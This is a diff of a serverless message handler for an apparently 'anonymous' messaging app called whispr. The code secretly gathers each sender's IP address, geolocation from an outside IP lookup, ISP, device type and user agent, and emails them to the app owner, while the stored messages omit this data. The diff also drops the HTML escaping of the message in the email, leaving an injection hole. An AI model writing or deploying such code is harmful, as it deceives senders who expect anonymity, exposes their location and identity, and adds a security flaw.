@@ -1,10 +1,30 @@
+const { kv } = require('@vercel/kv');
 const nodemailer = require('nodemailer');
 
-// In-memory store (lives for duration of serverless instance)
-if (!global._messages) global._messages = [];
+// Helper function to get location data from IP if Vercel headers are missing
+async function getExtendedMetadata(ip) {
+  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
+    return { city: 'Local', region: 'Local', country: 'Local', isp: 'Internal' };
+  }
+  try {
+    // We use ip-api.com (free for development) to look up the IP
+    const response = await fetch(`http://ip-api.com/json/${ip}`);
+    const data = await response.json();
+    if (data.status === 'success') {
+      return {
+        city: data.city,
+        region: data.regionName,
+        country: data.country,
+        isp: data.isp
+      };
+    }
+  } catch (e) {
+    console.error("Geo Lookup Error:", e);
+  }
+  return null;
+}
 
 module.exports = async function handler(req, res) {
-  // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -13,110 +33,85 @@ module.exports = async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   const { username, message } = req.body;
+  if (!username || !message) return res.status(400).json({ error: 'Missing data' });
 
-  if (!username || !message) {
-    return res.status(400).json({ error: 'Username and message are required' });
+  // 1. IMPROVED IP DETECTION
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+             req.headers['x-real-ip'] || 
+             req.socket.remoteAddress || 
+             'Unknown';
+
+  // 2. STRONGER LOCATION DETECTION (Vercel Headers + API Fallback)
+  let city = req.headers['x-vercel-ip-city'];
+  let country = req.headers['x-vercel-ip-country'];
+  let region = req.headers['x-vercel-ip-region'];
+  let isp = "Vercel Edge";
+
+  // If Vercel headers are missing (localhost or failed detection), use the IP lookup
+  if (!city || !country) {
+    const extra = await getExtendedMetadata(ip);
+    if (extra) {
+      city = extra.city;
+      country = extra.country;
+      region = extra.region;
+      isp = extra.isp;
+    }
   }
 
-  // ── Capture metadata from Vercel headers ──
-  const ip =
-    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-    req.headers['x-real-ip'] ||
-    'Unknown';
-
-  const userAgent = req.headers['user-agent'] || 'Unknown';
-
-  const country  = req.headers['x-vercel-ip-country']  || 'Unknown';
-  const city     = req.headers['x-vercel-ip-city']     || 'Unknown';
-  const region   = req.headers['x-vercel-ip-region']   || 'Unknown';
-
-  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);
-  const deviceType = isMobile ? 'Mobile' : 'Desktop';
-
+  // 3. BETTER DEVICE DETECTION
+  const ua = req.headers['user-agent'] || '';
+  const isMobile = /mobile/i.test(ua);
+  const isIphone = /iphone/i.test(ua);
+  const isAndroid = /android/i.test(ua);
+  const deviceType = isIphone ? 'iPhone' : isAndroid ? 'Android' : isMobile ? 'Mobile' : 'Desktop';
+  
   const timestamp = new Date().toISOString();
   const readableTime = new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });
 
-  // ── Store message (no metadata stored) ──
-  global._messages.unshift({
-    id: Date.now(),
-    username,
-    message,
-    timestamp,
-  });
-
-  // Keep max 100 messages in memory
-  if (global._messages.length > 100) {
-    global._messages = global._messages.slice(0, 100);
+  // 4. SAVE TO KV
+  try {
+    await kv.lpush('messages', { id: Date.now(), username, message, timestamp });
+    await kv.ltrim('messages', 0, 99);
+  } catch (dbError) {
+    console.error("KV Error:", dbError.message);
   }
 
-  // ── Send email with full metadata ──
+  // 5. SEND IMPROVED EMAIL
   try {
     const transporter = nodemailer.createTransport({
       service: 'gmail',
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS,
-      },
+      auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
     });
-
-    const emailHtml = `
-<!DOCTYPE html>
-<html>
-<head>
-  <style>
-    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f4f8; margin: 0; padding: 20px; }
-    .wrapper { max-width: 520px; margin: 0 auto; }
-    .card { background: #fff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
-    .header { background: linear-gradient(135deg, #f02d7d, #ff6b35); padding: 24px 28px; }
-    .header h2 { color: #fff; margin: 0; font-size: 20px; }
-    .header small { color: rgba(255,255,255,0.8); font-size: 13px; }
-    .body { padding: 28px; }
-    .from { font-size: 13px; color: #999; margin-bottom: 4px; }
-    .msg-text { font-size: 18px; font-weight: 600; color: #111; line-height: 1.5; margin-bottom: 28px; border-left: 4px solid #f02d7d; padding-left: 16px; }
-    .meta-box { background: #f7f7fb; border-radius: 12px; padding: 18px; }
-    .meta-title { font-size: 11px; letter-spacing: 1px; color: #999; text-transform: uppercase; margin-bottom: 12px; }
-    .meta-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
-    .meta-label { color: #888; }
-    .meta-val { color: #333; font-weight: 500; text-align: right; max-width: 60%; word-break: break-all; }
-    .footer { padding: 16px 28px; text-align: center; color: #bbb; font-size: 12px; border-top: 1px solid #f0f0f0; }
-  </style>
-</head>
-<body>
-  <div class="wrapper">
-    <div class="card">
-      <div class="header">
-        <h2>👁 New whispr message</h2>
-        <small>${readableTime}</small>
-      </div>
-      <div class="body">
-        <div class="from">From @${username}</div>
-        <div class="msg-text">${message.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
-
-        <div class="meta-box">
-          <div class="meta-title">Sender Details</div>
-          <div class="meta-row"><span class="meta-label">IP Address</span><span class="meta-val">${ip}</span></div>
-          <div class="meta-row"><span class="meta-label">Device</span><span class="meta-val">${deviceType}</span></div>
-          <div class="meta-row"><span class="meta-label">Location</span><span class="meta-val">${city}, ${region}, ${country}</span></div>
-          <div class="meta-row"><span class="meta-label">User Agent</span><span class="meta-val">${userAgent}</span></div>
-          <div class="meta-row"><span class="meta-label">Time (PHT)</span><span class="meta-val">${readableTime}</span></div>
-        </div>
-      </div>
-      <div class="footer">whispr anonymous messaging</div>
-    </div>
-  </div>
-</body>
-</html>
-    `;
 
     await transporter.sendMail({
       from: `"whispr 👁" <${process.env.EMAIL_USER}>`,
       to: process.env.OWNER_EMAIL,
-      subject: `💌 New anonymous message from @${username}`,
-      html: emailHtml,
+      subject: `💌 New message from @${username}`,
+      html: `
+        <div style="font-family: sans-serif; max-width: 500px; border: 1px solid #eee; border-radius: 10px; padding: 20px; color: #333;">
+          <h2 style="color: #e8176e; margin-top: 0;">New Anonymous Message!</h2>
+          <div style="background: #f9f9f9; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; margin-bottom: 20px;">
+            "${message}"
+          </div>
+          
+          <table style="width: 100%; font-size: 13px; color: #666;">
+            <tr><td><strong>User:</strong></td><td>@${username}</td></tr>
+            <tr><td><strong>Device:</strong></td><td>${deviceType}</td></tr>
+            <tr><td><strong>Location:</strong></td><td>${city}, ${region}, ${country}</td></tr>
+            <tr><td><strong>IP Address:</strong></td><td>${ip}</td></tr>
+            <tr><td><strong>Provider:</strong></td><td>${isp}</td></tr>
+            <tr><td><strong>Time:</strong></td><td>${readableTime}</td></tr>
+          </table>
+          
+          <p style="font-size: 11px; color: #bbb; margin-top: 20px; text-align: center;">
+            Browser Info: ${ua.substring(0, 100)}...
+          </p>
+        </div>
+      `
     });
+    console.log(`📧 Email sent for @${username} (Loc: ${city}, ${country})`);
   } catch (emailError) {
-    console.error('Email error:', emailError.message);
-    // Still return success — message is stored even if email fails
+    console.error('📧 Email Error:', emailError.message);
   }
 
   return res.status(200).json({ ok: true });
